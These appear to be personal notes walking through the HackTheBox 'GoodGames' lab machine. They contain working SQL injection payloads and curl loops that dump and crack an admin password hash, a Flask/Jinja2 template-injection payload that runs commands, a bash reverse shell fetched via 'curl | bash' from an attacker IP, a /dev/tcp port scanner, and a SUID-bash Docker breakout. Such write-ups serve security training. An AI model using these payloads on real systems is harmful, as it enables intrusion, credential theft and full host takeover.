HackTheBox
## SQL Injection
[[Error-based SQL-Injection]]
Payload: *' or 1=1-- -* 
*;* is not necessary because of pyhton syntax
![[Pasted image 20240323105506.png]]
![[Pasted image 20240323121529.png]]

As admin, we found a administration console that we will review further as we don't have credentials

http://internal-administration.goodgames.htb/

By using *orden by*, we can determine the numer of columns
payload: *' order by 10-- -*
We can analyze the size on Content-Lenght
![[Pasted image 20240323121952.png]]
By using 4, it changes, then we can infer that the current table has 4 columns or less
![[Pasted image 20240323122104.png]]

Payload using union: *' union select 1,2,3,"test"-- -*
We verify that this information affects the site
![[Pasted image 20240323122204.png]]
### Testing SSTI by SQL
Tested because we found the usage of template Flask
*' `union select 1,2,3,"{{7*7}}"-- -`* but it doesn't work, we expected 49.

### Dumping
To get the name of the current database:
*' union select 1,2,3,database()-- -* 
![[Pasted image 20240323122543.png]]
#### Enumerating DBs
*' union select 1,2,3,schema_name from information_schema.schemata-- -* 

![[Pasted image 20240323122815.png]]
>information_schema, name

#### Enumerating table
Enumerating first table of information_schema
*' union select 1,2,3,table_name from information_schema.tables limit 0,1-- -* 

Enumerating all tables found
`for i in $(seq 1 100); do echo "[+] For number $i: $(curl -s -X POST http://goodgames.htb/login --data "email=test%40test' union select 1,2,3,table_name from information_schema.tables limit $i,1-- -&password=test" | grep "Welcome" | sed "s/^ *//" | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done`

![[Pasted image 20240323140137.png]]

#### Enumerating only DB main's tables
`for i in $(seq 0 100); do echo "[+] For number $i: $(curl -s -X POST http://goodgames.htb/login --data "email=test%40test' union select 1,2,3,table_name from information_schema.tables where table_schema=\"main\" limit $i,1-- -&password=test" | grep "Welcome" | sed "s/^ *//" | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done`

Here, `\` is used as an escape character in the context of a shell command. Its purpose is to ensure that the double quotes are interpreted as literal characters within the string being sent to the server, rather than being interpreted by the shell.
![[Pasted image 20240323140753.png]]

#### Enumerating columns of table user

`for i in $(seq 0 100); do echo "[+] For number $i: $(curl -s -X POST http://goodgames.htb/login --data "email=test%40test' union select 1,2,3,column_name from information_schema.columns where table_schema=\"main\" and table_name=\"user\" limit $i,1-- -&password=test" | grep "Welcome" | sed "s/^ *//" | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done`

![[Pasted image 20240323141103.png]]

#### Dumping columns information: name, id, passwd
`for i in $(seq 0 100); do echo "[+] For number $i: $(curl -s -X POST http://goodgames.htb/login --data "email=test%40test' union select 1,2,3,group_concat(name,0x3a,email,0x3a,password) from user limit $i,1-- -&password=test" | grep "Welcome" | sed "s/^ *//" | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done`
>[+] For number 0: admin:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec,test:test@test.com:098f6bcd4621d373cade4e832627b4f6

Using **hash-identifier**, it detects that is mds
`hash-identifier 2b22337f218b2d82dfc3b6f77e7cb8ec`

## Cracking credentials
`john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5`
>superadministrator (?)

We can find this by using a **rainbowtable**
https://crackstation.net/

To get access to this, we need to add it to /etc/hosts
http://internal-administration.goodgames.htb/

![[Pasted image 20240323170836.png]]
Trying credentials found user: *admin* pass: *superadministrator*

## Server Side Template Injection
[[Server Site Template Injection (SSTI)]]

Again, as it's using flask (template), we found a SSTI vulnerability in fullname field
![[Pasted image 20240323171727.png]]

Injecting a RCI payload:
`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}` executes *id*
![[Pasted image 20240323172433.png]]

Injecting *hostname -I*, we found we are in a container:
![[Pasted image 20240323172544.png]]

### Creating a reverse shell using bash

index.html *to use it by curl in a python dumb server*

#!/bin/bash
bash -i >& /dev/tcp/10.10.14.70/4443 0>&1

payload:
`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl http://10.10.14.70 | bash').read() }}`

![[Pasted image 20240323173448.png]]

Interactive shell

## Docker Breakout
[[Docker Breakout]]

![[Pasted image 20240323192630.png]]

`1000`: This part represents the group ID (GID) of the file. Since a group name is not displayed, it's likely that there's no corresponding entry in the container's `/etc/group` file for this GID. In many Linux distributions, a GID of 1000 is commonly the first user created on the system (often not `root`), suggesting this file might have been created or brought into the container from the host system or another context where the GID 1000 has a specific group name.

As user *augustus* doesn't exist in this container and group 1000 is not found in the container too: `cat /etc/group` so we can infer that this path is been brought from the host machine by using *mount*. 
##### Important: 
Permission on files are showing users ids instead of names!

`mount | grep home`

![[Pasted image 20240323193536.png]]

Reviewing open ports in the container:

 `#!/bin/bash`

`function ctrl_c(){`
	`echo -e "\n\n[!] Quitting..\n"`
	 `tput cnorm; exit 1`
`}`

 `#Ctrl+C`
`trap ctrl_c INT`
 
`tput civis`
`for port in $(seq 1 65565); do`
	`timeout 1 bash -c "echo '' > /dev/tcp/172.19.0.1/$port" 2>/dev/null && echo "[+] Port $port --open" &`
`done; wait`
`tput cnorm`

#### Transfer by base64
To transfer this script, we can do it by encoding in base64

`base64 -w 0 ports.sh | xclip -sel clip` 
![[Pasted image 20240323201108.png]]

Before we infered that the victine is 172.19.0.1 because is the only IP found as it's the gateway
![[Pasted image 20240323201152.png]]

Trying by SSH since port 22 is open using user *augustus* and the password we already found before *superadministrator*

We are now into the machine host
![[Pasted image 20240323201343.png]]
![[Pasted image 20240323201408.png]]

`cd /`
`find \-perm -4000 2>/dev/null`
![[Pasted image 20240323201932.png]]

Nothing interesting
### Privilege Escalation
We can take advantage of the mount folder by coping */bin/bash* binary to */home/augustus* and from the docker container, granting SUID permissions

`augustus@GoodGames:~$ cp /bin/bash/ .`

From container
`root@3a453ab39d3d:/home/augustus# chown root:root bash`
>-rwxr-xr-x 1 root root 1234376 Mar 24 01:43 bash

`root@3a453ab39d3d:/home/augustus# chmod 4755 bash`
`root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1`

From host machine:
`augustus@GoodGames:~$ ./bash -p`
`bash-5.1#` 



